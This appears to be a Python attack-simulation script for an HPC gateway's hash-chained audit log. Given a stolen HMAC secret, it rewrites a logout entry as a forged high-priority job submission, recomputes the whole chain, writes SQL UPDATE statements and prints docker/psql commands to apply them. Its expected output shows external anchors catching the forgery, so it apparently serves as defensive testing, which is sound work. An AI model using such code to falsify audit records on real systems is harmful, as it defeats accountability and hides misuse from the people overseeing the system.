

import hmac as hmac_module
import hashlib
import json

# ── Stolen credentials ────────────────────────────────────────────────────
CHAIN_SECRET = b"***REMOVED***"

# ── CORRECT starting prev_hash — read directly from entry #1 in DB ───────
# This is the actual prev_hash stored in the first audit entry.
# The attacker reads this from the DB — it's stored in plaintext.
CORRECT_GENESIS_PREV_HASH = "7bad34ef2734c24cbdbd260e0305695e23b3ef3e0f669e131433728a24d86281"

# ── All 20 entries in chronological order ─────────────────────────────────
ENTRIES = [
    ("03a9abbd-f463-44bc-91e9-131856cfc417", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T10:59:43.523952+00:00"),
    ("139ad48b-0308-41b9-be04-c6a7ff480f4c", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:35.549971+00:00"),
    ("5bbd377f-c9a4-4469-9eab-66a6aa362b44", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:35.639319+00:00"),  
    ("8371f686-5061-495e-b4cd-4884dc615124", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:35.728076+00:00"),
    ("e5e3288f-3b43-4893-9c60-07d8c4243fb1", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:35.819623+00:00"),
    ("f3d82b03-9031-4d92-a97e-7b5fd101378e", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:35.918333+00:00"),
    ("5bb70bc1-0d14-4b9f-80da-5261a3124083", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:36.005999+00:00"),
    ("11e15a2b-7707-4f57-ab06-b468c014f10d", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:36.094125+00:00"),
    ("6bdcd3b3-b896-4d1c-85c2-8dbfd2d59c35", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:36.186715+00:00"),
    ("d9ef1182-b631-4523-be66-9d7d7142f3e6", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:00:36.272848+00:00"),
    ("932345a3-a7a6-4453-995a-e267afbefce9", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.084815+00:00"),
    ("13b1e601-f001-4db4-bac9-875b3dd79ef3", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.178095+00:00"),
    ("14e9683c-3c56-4962-a48f-4112c9825608", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.261978+00:00"),
    ("ff696157-b560-4887-85d2-2b57ba85f6ed", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.345230+00:00"),
    ("1c29a9b7-e93b-4b3a-a330-8b16e4c64cc8", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.427604+00:00"),
    ("5c5b9a42-1502-4946-a471-5e6f92673e86", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.517023+00:00"),
    ("53c8814c-b141-4fcd-87a1-cd678db00a41", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.600046+00:00"),
    ("15dd9d8e-1640-4680-b7a6-2de9e01c8c17", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.682857+00:00"),
    ("b2bbec72-6eb2-442f-91fb-2056907246d3", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.767404+00:00"),
    ("3906ab16-9253-4cca-9617-c86e53808ca7", "logout", "success", "655abeb1-6951-465d-b5f1-d293296d18fd", {"username": "aichaguemir"}, "2026-05-08T11:08:21.852709+00:00"),
]

# ── Tamper target ─────────────────────────────────────────────────────────
TAMPERED_ID     = "5bbd377f-c9a4-4469-9eab-66a6aa362b44"
TAMPERED_ACTION = "job_submit"
TAMPERED_RESULT = "success"
TAMPERED_DETAIL = {"username": "aichaguemir", "cores": 320, "queue": "critical"}

print("=" * 65)
print("ATTACK 2 (FIXED): Attacker with secret key + correct genesis hash")
print("=" * 65)
print(f"  Tampered entry : {TAMPERED_ID}")
print(f"  Original action: logout")
print(f"  Forged action  : {TAMPERED_ACTION}")
print(f"  Forged detail  : {TAMPERED_DETAIL}")
print(f"  Starting from  : prev_hash = {CORRECT_GENESIS_PREV_HASH[:32]}...")
print()


def compute_hmac(prev_hash, timestamp, user_id, action, result, detail):
    content = json.dumps({
        "prev_hash": prev_hash,
        "timestamp": timestamp,
        "user_id":   user_id,
        "action":    action,
        "result":    result,
        "detail":    detail,
    }, sort_keys=True, separators=(',', ':'))
    return hmac_module.new(
        CHAIN_SECRET,
        content.encode(),
        hashlib.sha256,
    ).hexdigest()


# ── Recompute full chain from correct starting point ──────────────────────
print("Recomputing full HMAC chain...")
print()

prev_hash   = CORRECT_GENESIS_PREV_HASH
sql_updates = []

for i, (log_id, action, result, user_id, detail, timestamp) in enumerate(ENTRIES):

    if log_id == TAMPERED_ID:
        action  = TAMPERED_ACTION
        result  = TAMPERED_RESULT
        detail  = TAMPERED_DETAIL
        print(f"  [TAMPERED] Entry #{i+1:2d}: action={action}")
    
    new_hash = compute_hmac(prev_hash, timestamp, user_id, action, result, detail)
    print(f"  Entry #{i+1:2d}: {prev_hash[:16]}... → {new_hash[:16]}...")

    detail_escaped = json.dumps(detail).replace("'", "''")
    sql_updates.append(
        f"UPDATE audit_log SET "
        f"action='{action}', "
        f"result='{result}', "
        f"detail='{detail_escaped}', "
        f"chain_hash='{new_hash}', "
        f"prev_hash='{prev_hash}' "
        f"WHERE log_id='{log_id}';"
    )

    prev_hash = new_hash

print()
print(f"Forged chain hash at entry 20: {prev_hash}")
print(f"Original chain hash at entry 20: 8438811a0e6a45939fa59757768acddaa39d9f04a47778856fdc26c406688fc1")
print(f"Match: {prev_hash == '8438811a0e6a45939fa59757768acddaa39d9f04a47778856fdc26c406688fc1'}")
print()

# ── Write SQL ─────────────────────────────────────────────────────────────
with open("/tmp/attack2.sql", "w") as f:
    f.write("BEGIN;\n")
    f.write("\n".join(sql_updates))
    f.write("\nCOMMIT;\n")

print("SQL written to /tmp/attack2.sql")
print()
print("Execute with:")
print("  docker cp /tmp/attack2.sql hpc-postgres:/tmp/attack2.sql")
print("  docker exec hpc-postgres psql -U hpcuser -d hpc_gateway -f /tmp/attack2.sql")
print()
print("Then verify:")
print("  curl -sk -H \"Authorization: Bearer $TOKEN\" \\")
print("    https://localhost/api/v1/admin/audit/verify/full | python3 -m json.tool")
print()
print("EXPECTED:")
print("  chain_check  → valid: TRUE   ← attacker fooled HMAC chain ✓")
print("  anchor_check → valid: FALSE  ← caught by local anchor ✗")
print("  rekor_check  → valid: FALSE  ← caught by Rekor forever ✗")
